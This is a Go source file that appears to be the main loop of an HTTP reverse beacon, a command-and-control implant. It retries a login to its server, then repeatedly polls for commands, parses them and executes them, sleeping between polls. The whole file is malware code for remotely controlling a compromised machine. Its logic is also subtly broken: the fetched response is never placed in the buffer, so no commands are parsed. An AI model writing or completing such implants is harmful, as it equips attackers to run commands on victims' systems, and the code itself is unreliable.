package main

import (
	"bytes"
	"http_reverse_beacon/command"
	"http_reverse_beacon/packet"
	"http_reverse_beacon/profile"
	"time"
)

func main() {
	for {
		cmd := &command.InfoCommand{}
		resp := cmd.Login()
		if resp != nil {
			break
		}
		time.Sleep(time.Duration(profile.SleepTime))
	}

	for {
		resp := packet.GetCommandRequest()
		if resp != nil {
			buf := bytes.NewBuffer([]byte{})
			buf_size := len(buf.Bytes())
			for cursor := 0; cursor < buf_size; {
				cmd, err := command.Parse(buf, &cursor)
				if err != nil {
					break
				}
				cmd.Execute()
			}
		}
		time.Sleep(time.Duration(profile.SleepTime))
	}
}
